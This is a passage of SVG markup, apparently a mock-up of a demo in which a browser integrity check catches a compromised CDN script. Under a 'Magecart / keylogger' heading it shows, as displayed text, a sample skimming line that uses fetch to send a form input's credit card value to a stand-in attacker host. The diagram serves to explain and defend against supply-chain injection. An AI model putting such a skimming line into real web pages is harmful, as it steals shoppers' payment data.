    <text x="36" y="150" fill="#f1f5f9" font-size="12" font-family="monospace">}</text>

    <text x="24" y="180" fill="#94a3b8" font-size="12" font-weight="600">MALICIOUS INJECTION (MAGECART / KEYLOGGER)</text>
    <rect x="24" y="190" width="502" height="70" rx="6" fill="#172133" stroke="#233047"/>
    <text x="36" y="215" fill="#f43f5e" font-size="12" font-family="monospace">/* Injected by CDN Attacker */</text>
    <text x="36" y="235" fill="#f43f5e" font-size="12" font-family="monospace">fetch("https://evil-stealer.com/collect?cc=" + input.value);</text>

    <rect x="24" y="285" width="18" height="18" rx="4" fill="#06b6d4"/>
    <text x="28" y="299" fill="#04121d" font-size="12" font-weight="700">✓</text>
    <text x="52" y="299" fill="#f1f5f9" font-size="13">Simulate CDN Compromise (Inject altered bytes into stream)</text>

    <rect x="24" y="325" width="18" height="18" rx="4" fill="#06b6d4"/>
    <text x="28" y="339" fill="#04121d" font-size="12" font-weight="700">✓</text>
    <text x="52" y="339" fill="#f1f5f9" font-size="13">Enable CORS (crossorigin="anonymous" present)</text>

    <rect x="24" y="380" width="502" height="42" rx="6" fill="#06b6d4"/>
    <text x="275" y="406" fill="#04121d" font-size="14" font-weight="700" text-anchor="middle">Execute Browser Integrity Check</text>
  </g>

  <!-- Right Results -->
  <g transform="translate(618, 90)" filter="url(#shadow2)">
